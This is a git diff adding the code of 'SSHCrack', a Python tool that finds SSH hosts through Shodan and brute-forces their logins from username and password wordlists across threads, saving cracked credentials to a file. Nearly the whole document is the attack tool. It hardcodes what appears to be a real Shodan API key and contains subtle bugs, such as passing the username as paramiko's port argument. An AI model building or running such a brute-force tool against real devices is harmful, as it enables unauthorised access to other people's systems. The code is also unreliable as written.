@@ -1,3 +1,14 @@
+# Made in Python 3.9.6
+# SSHCrack v1.0
+# Created by BredSec
+# GitHub: https://github.com/BredSec
+# This script is designed to help automate the process of hacking into multiple vulnerable SSH IoT devices simultaneously
+
+
+# Splitting up tasks between threads
+# Stopping the scripts
+
+
 import shodan
 import threading
 import os
@@ -5,89 +16,223 @@ import paramiko
 import sys
 import getopt
 
+global api
 shodanAPIKey = "8t0SrW5P3emGYkm2rvWzQmcDOSdToYUV"
 api = shodan.Shodan(shodanAPIKey)
 
-client = paramiko.SSHClient()
-client.load_system_host_keys()
-#client.look_for_keys(True)
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-target = ""
-iplist = ""
-userlist = ""
-passlist = ""
-output = ""
+global ips
+ips = []
 
 def main(argv):
+    apikey = "testing"
+    target = ""
+    iplist = ""
+    userlist = "usernames.txt"
+    passlist = "passwordlist.txt"
+    users = []
+    passwords = []
+    output = "output.txt"
+    multi = 1
+    xmode = False
+    verbose = False
+
     try:
-        opts, args = getopt.getopt(argv, "ht:i:u:p:o:", ["help", "target=", "iplist=", "userlist=", "passlist=", "output="])
+        opts, args = getopt.getopt(argv, "ha:t:i:u:p:o:m:xv", ["help", "apikey=" "target=", "iplist=", "userlist=", "passlist=", "output=", "multi=", "verbose"])
     except getopt.GetoptError:
-        print("   _____ _____ _    _  _____ _____            _____ _  __")
-        print("  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
-        print(" | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
-        print("  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
-        print("  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
-        print(" |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.0\n")
-        print("              Created by @BredSec")
+        print("\033[0;32m   _____ _____ _    _  _____ _____            _____ _  __")
+        print("\033[0;32m  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
+        print("\033[0;32m | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
+        print("\033[0;32m  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
+        print("\033[0;32m  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
+        print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.0\n")
+        print("\033[0;32m              Created by @BredSec")
         print("\n")
-        print("       Disclaimer: Developers not liable or responsible")
-        print("       for misuse or damage caused by SSHCrack")
+        print("\033[0;31m       Disclaimer: Developers not liable or responsible")
+        print("\033[0;31m       for misuse or damage caused by SSHCrack")
         print("\n")
-        print("usage: python sshcrack.py [-h --help] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]")
+        print("\033[0musage: python sshcrack.py [-h --help] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
         print("\n")
         print("-h --help                     | Display help menu of arguments and command use")
         print("\n")
         print("-t --target <target>          | Used to conduct an ssh search with shodan on a specified target")
         print("-i --iplist <ip list>         | Specify a file with a list of IPs to enumerate through and crack")
-        print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through (default will be common default ssh logins)")
-        print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through (default will be common default ssh logins)")
+        print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through")
+        print("                              (default will be common default ssh logins)")
+        print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
+        print("                              (default will be common default ssh logins)")
         print("-o --output <filename>        | Specify the name of an output file for successful logins")
+        print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
+        print("-x                            | X mode - runs cracking on all searched IPs immediately")
+        print("-v --verbose                  | Verbose mode - display everything going on")
         print("\n")
         sys.exit(2)
 
     for opt, arg in opts:
         if opt in ("-h", "--help"):
-            print("   _____ _____ _    _  _____ _____            _____ _  __")
-            print("  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
-            print(" | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
-            print("  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
-            print("  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
-            print(" |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.0\n")
-            print("              Created by @BredSec")
+            print("\033[0;32m   _____ _____ _    _  _____ _____            _____ _  __")
+            print("\033[0;32m  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
+            print("\033[0;32m | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
+            print("\033[0;32m  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
+            print("\033[0;32m  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
+            print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.0\n")
+            print("\033[0;32m              Created by @BredSec")
+            print("")
+            print("\033[0;31m       Disclaimer: Developers not liable or responsible")
+            print("\033[0;31m       for misuse or damage caused by SSHCrack")
             print("\n")
-            print("       Disclaimer: Developers not liable or responsible")
-            print("       for misuse or damage caused by SSHCrack")
-            print("\n")
-            print("usage: python sshcrack.py [-h --help] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]")
+            print("\033[0musage: python sshcrack.py [-h --help] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
             print("\n")
             print("-h --help                     | Display help menu of arguments and command use")
             print("\n")
             print("-t --target <target>          | Used to conduct an ssh search with shodan on a specified target")
             print("-i --iplist <ip list>         | Specify a file with a list of IPs to enumerate through and crack")
-            print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through (default will be common default ssh logins)")
-            print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through (default will be common default ssh logins)")
+            print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through")
+            print("                              (default will be common default ssh logins)")
+            print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
+            print("                              (default will be common default ssh logins)")
             print("-o --output <filename>        | Specify the name of an output file for successful logins")
+            print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
+            print("-x                            | X mode - runs cracking on all searched IPs immediately")
+            print("-v --verbose                  | Verbose mode - display everything going on")
             print("\n")
+            sys.exit(0)
+        elif opt in ("-a", "--apikey"):
+            apikey = arg
+            #try:
+            #    api = shodan.Shodan(apikey)
+            #except shodan.APIError as error:
+            #    print("Error: {}".format(error))
+        elif opt in ("-t", "--target"):
+            target = arg
+        elif opt in ("-i", "--iplist"):
+            iplist = arg
+        elif opt in ("-u", "--userlist"):
+            userlist = arg
+        elif opt in ("-p", "--passlist"):
+            passlist = arg
+        elif opt in ("-o", "--output"):
+            output = arg
+        elif opt in ("-m", "--multi"):
+            try:
+                multi = int(arg)
+            except OSError as error:
+                print("Error: {}".format(error))
+        elif opt in ("-x"):
+            xmode = True
+        elif opt in ("-v", "--verbose"):
+            verbose = True
 
-#take arguments for target search and ip, username, and password wordlists in a function
-#set defaults if none specified and ask for confirmation
+    if iplist != "":
+        try:
+            with open(iplist) as f:
+                words = f.readlines()
+                for word in words:
+                   word = word.replace("\n", "")
+                   ips.append(word)
+        except OSError as error:
+            print("Error: {}".format(error))
+            sys.exit(2)
 
-#use shodan to perform a search on ssh ports within target location
-#add results to a file and ip list to an array
+    try:
+        with open(userlist) as f:
+            words = f.readlines()
+            for word in words:
+               word = word.replace("\n", "")
+               users.append(word)
+    except OSError as error:
+        print("Error: {}".format(error))
+        sys.exit(2)
 
-#use multithreading to run multiple instances of sshcracker for the different ips
+    try:
+        with open(passlist) as f:
+            words = f.readlines()
+            for word in words:
+               word = word.replace("\n", "")
+               passwords.append(word)
+    except OSError as error:
+        print("Error: {}".format(error))
+        sys.exit(2)
 
+    if target != "":
+        if apikey == "":
+            print("Must specify a Shodan API key")
+            sys.exit(2)
+        else:
+            search(target, xmode)
+    elif target == "" and iplist == "":
+        print("Must specify a target to search for or an IP address list")
+        sys.exit(2)
 
-def SSHConnect(ip, userList, passList):
-    #load ip list
-    #load username list
-    #load password list
+    print("IPs to be cracked: " + str(len(ips)))
 
-    #parse through usernames and try passwords for each ip addr
+    if multi > 1:
+        MultiThreading(multi, users, passwords, output, verbose)
+    else:
+        SSHConnect(users, passwords, output, verbose)
 
-    #return with correct combination once succeeding to get in and add it to a file
-    print("hi")
+def search(target, xmode):
+    ipaddr = []
+    try:
+        results = api.search(target)
+
+        print("Results found: {}".format(results["total"]))
+        for result in results["matches"]:
+            if result["port"] == 22:
+                ipaddr.append(result["ip_str"])
+                if xmode == True:
+                    ips.append (result["ip_str"])
+            else:
+                continue
+        with open("Search_IP_Addresses.txt", "w") as f:
+            f.write("\n".join(ipaddr))
+
+    except shodan.APIError as error:
+        print("Error: {}".format(error))
+        sys.exit(2)
+
+def MultiThreading(multiNum, userList, passList, output, verbose):
+    try:
+        x = list(divide_list(userList, multiNum))
+        y = list(divide_list(passList, multiNum))
+        for i in range(multiNum):
+            if verbose:
+                print("Creating thread " + str(i))
+            threading.Thread(target=SSHConnect, args=(x[i], y[i], output, verbose)).start()
+    except OSError as error:
+        print("Error: {}".format(error))
+
+def SSHConnect(userList, passList, output, verbose):
+    client = paramiko.SSHClient()
+    client.load_system_host_keys()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    out = open(output, "w")
+
+    for ip in ips:
+        breakout = False
+        for user in userList:
+            for password in passList:
+                if verbose:
+                    print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
+                try:
+                    client.connect(ip, user, password)
+                    print("SUCESS: " + user + "@" + user + " " + password)
+                    client.close()
+                    out.write(ip + "@" + user + " " + password)
+                    out.write("\n")
+                    breakout = True
+                    break
+                except:
+                    continue
+            if breakout:
+                break
+    
+    print("\nCracking completed")
+    sys.exit(0)
+
+def divide_list(list, num):
+    for i in range(0, len(list), num):
+        yield list[i:i + num]
 
 if __name__ == "__main__":
     main(sys.argv[1:])
